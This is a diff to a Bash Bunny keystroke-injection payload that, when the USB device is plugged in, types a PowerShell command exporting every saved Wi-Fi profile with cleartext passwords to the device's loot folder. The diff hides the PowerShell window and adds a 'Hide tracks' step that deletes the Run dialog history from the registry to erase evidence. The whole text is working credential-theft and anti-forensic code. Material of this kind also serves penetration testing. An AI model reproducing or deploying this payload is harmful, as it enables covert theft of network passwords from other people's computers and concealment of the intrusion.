@@ -33,7 +33,7 @@ Q DELAY 1000
 
 # enter payload and execute
 
-Q STRING powershell \$bunny\=\(gwmi win32_volume -f \'label=\\\"BashBunny\\\"\'\).NAME\; cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
+Q STRING powershell -WindowStyle Hidden \$bunny\=\(gwmi win32_volume -f \'label=\\\"BashBunny\\\"\'\).NAME\; cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
 Q ENTER
 
 #Let code run, then sync
@@ -42,6 +42,22 @@ Q DELAY 5000
 
 sync
 
+# Wait for misc. to happen on computer
+
+Q DELAY 1000
+
+# Hide tracks
+
+LED B 500
+
+   QUACK GUI r
+   QUACK DELAY 1000
+   QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+   QUACK ENTER
+
+QUACK DELAY 1000
+
 # Done!
 
 LED G
+
